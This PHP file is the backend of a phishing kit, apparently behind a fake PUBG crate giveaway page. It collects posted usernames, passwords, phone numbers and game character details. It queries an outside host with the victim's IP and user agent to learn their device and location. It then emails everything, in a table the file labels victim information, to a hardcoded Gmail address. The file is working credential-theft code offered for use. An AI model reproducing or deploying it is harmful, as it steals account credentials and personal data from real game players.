<?php
// BILANG SEND2MAIL AUTO BAKUHANTAM
// JGN DIRECODE YA BOSS
// NguyenThuWan 
// Happy Mancing
date_default_timezone_set("Asia/Makassar");
$date = date('d-M-Y H:i');
$user = $_POST['user'];

$pass = $_POST['pass'];
$login = $_POST['login'];
$id = $_POST['id'];
$nick = $_POST['nick'];
$hp = $_POST['hp'];
$level = $_POST['level'];
function get_client_ip() { 
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'];

$uax = urlencode($ua);
$chp = curl_init('http://newpubgcrate.64-b.it/system/ua.php?ua='.$uax.'');
curl_setopt($chp, CURLOPT_RETURNTRANSFER, true);
$up = curl_exec($chp);
curl_close($chp);
$iwan = explode("-",$up);
$ch = curl_init('http://newpubgcrate.64-b.it/system/flag.php?ip='.$ip.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$iwanganz = curl_exec($ch);
curl_close($ch);
$paku = str_replace('IwanGanteng','',$iwanganz);

//KONTEN UNTUK KIRIM KE EMAIL
$subjek = "$nick [$level] | $iwan[0] $iwan[1]";
$pesan = <<<EOD
<center> 
<div style="background: url(https://coverfiles.alphacoders.com/816/81621.jpg) no-repeat center center; background-size: 100% 100%; width: 294; height: 80px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>$user</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>$pass</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER ID</th>
<th style="width: 78%; text-align: center;"><b>$id</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER NAME</th>
<th style="width: 78%; text-align: center;"><b>$nick</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="width: 78%; text-align: center;"><b>$hp</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="width:78%;text-align:center;"><b>$level</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>$login</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Lokasi Korban</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Negara</th>
<th style="width: 78%; text-align: center;"><b>$wan[country] $paku</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Brand</th>
<th style="width: 78%; text-align: center;"><b>$iwan[0]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Model</th>
<th style="width: 78%; text-align: center;"><b>$iwan[1]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Os</th>
<th style="width: 78%; text-align: center;"><b>$iwan[2]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Browser</th>
<th style="width: 78%; text-align: center;"><b>$iwan[3]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="width: 78%; text-align: center;"><b>$ip</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>$date</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan saya:
</div>
<div style="float: right;">
<a href="http://wa.me/628971526865"><img style="margin: 5px;" width="30" src="https://i.ibb.co/SxcV8wB/facebook.png"></a>
<a href="https://t.me/nguyenthuwan"><img style="margin: 5px;" width="30" src="https://i.ibb.co/Ph7nCjg/telegram.png"></a>
</div>
</div>
</center>
EOD;
include'email.php';
$sender = 'From: Uncheck GG'.$paku.'<arpantek@gmail.com>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail("yuukikonno50@gmail.com", $subjek, $pesan, $headers);
?>